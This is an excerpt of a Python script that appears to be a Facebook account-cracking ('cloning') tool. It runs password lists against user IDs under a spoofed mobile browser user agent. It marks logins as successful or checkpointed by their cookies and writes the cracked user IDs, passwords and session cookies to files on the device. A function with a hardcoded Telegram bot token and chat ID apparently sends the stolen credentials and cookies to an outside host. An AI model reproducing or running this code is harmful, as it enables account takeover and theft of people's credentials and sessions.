...
for moad in range(5): 
    ...
    c='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36'
...
oks = []
twf = []
os.system('xdg-open https://t.me/@rilax_95')
os.system('xdg-open https://t.me/tolspydroid3_libya')
def linex():
    print(f'{GREEN}==========================================================')
...
def Elite(uid,ps,coki):
    try:
        import requests
        token = "6551155519:AAFD-SrX_YoCIjOhABBXFHA5TJ8FBHHTzGk"# 
        chatid = "5920570476"#
...
def Tabii():
    ...
    print(f"")
    limit = int(input(' EXAMPLE: 10000, 20000, 50000, 100000\n\n PUT CLONING LIMIT: '))
    ...
    try:
        for ps in pwx:
           ...
           'viewport-width': '980',}
            ...
            sys.stdout.write(f'\r\33[1;37m[RILAX ] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
            sys.stdout.flush()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[232:247]
                print(f'\r{GREEN}[RILAX -OK] '+uid+' | '+ps+'\n'f'{YELLOW}'+coki+'')
                Elite(uid,ps,coki)
                oks.append(cid) 
                cek_apk(session,coki)
                open('/sdcard/RILAX -OK.txt', 'a').write(cid+' | '+ps+'\n')
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid=coki[24:39]
                Red = '\033[1;31m'
                print(f'\r{RED}[RILAX -CP] '+uid+' | '+ps+'')
                open('/sdcard/RILAX -CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
                ...
                open('/sdcard/RILAX -Rgad.txt', 'a').write(cid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
